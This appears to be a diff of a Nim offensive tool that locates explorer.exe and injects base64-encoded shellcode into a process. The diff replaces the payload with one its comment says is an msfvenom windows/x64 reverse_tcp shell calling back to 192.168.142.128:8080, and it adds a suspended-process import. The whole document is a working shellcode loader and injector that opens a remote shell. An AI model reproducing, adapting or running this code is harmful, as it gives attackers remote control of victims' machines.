@@ -1,5 +1,6 @@
 import winim/lean, base64, osproc, winim/inc/psapi, unicode, strutils
 import winim/inc/tlhelp32
+import createSuspendedProcess
 
 
 proc getExplorerPID(): DWORD =
@@ -20,7 +21,7 @@ proc getExplorerPID(): DWORD =
   if Process32FirstW(hSnapshot, processEntry):
     # Print first process
     var procName = cast[WideCString](addr processEntry.szExeFile[0])
-    echo "Process: ", $procName
+  #  echo "Process: ", $procName
     if ($procName).toLowerAscii() == "explorer.exe":
       result = processEntry.th32ProcessID
       found = true
@@ -146,15 +147,17 @@ proc executeShellcode(shellcode: openarray[byte]): void =
         cast[GEO_ENUMPROC](rPtr)
     ) 
 
-let base64Str = """/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBRVkiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHB
-yQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCCLSBhQSQHQ
-41ZI/8lBizSITTHJSAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0Ac
-SQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJ
-ieZIgeygAQAASYnlSbwCAB+QwKiOgEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoK
-QV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/
-znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhI
-ifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoA
-WkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V
+# This base64 blob was generated with msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.142.128 LPORT=8080 -f raw -o reverse.bin
+
+let base64Str = """/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
+yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
+TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
+QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnl
+SbwCAB+QwKiOgEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInC
+SP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbqZpXRh/9VIgcRAAgAASbhjbWQAAAAAAEFQQVBI
+ieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6
+ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlB
+idr/1Q==
 """  
 
 let decodedData = decode(base64Str)
@@ -162,7 +165,7 @@ echo "decoded:", decodedData
 echo decodedData.len
 var buf: array[1642, byte] # is it 316
 copyMem(unsafeAddr(buf[0]), unsafeAddr(decodedData[0]), decodedData.len)
-echo buf.len
+
 # pop msgbox
 injectShellcode(buf)
 #executeShellcode(buf)
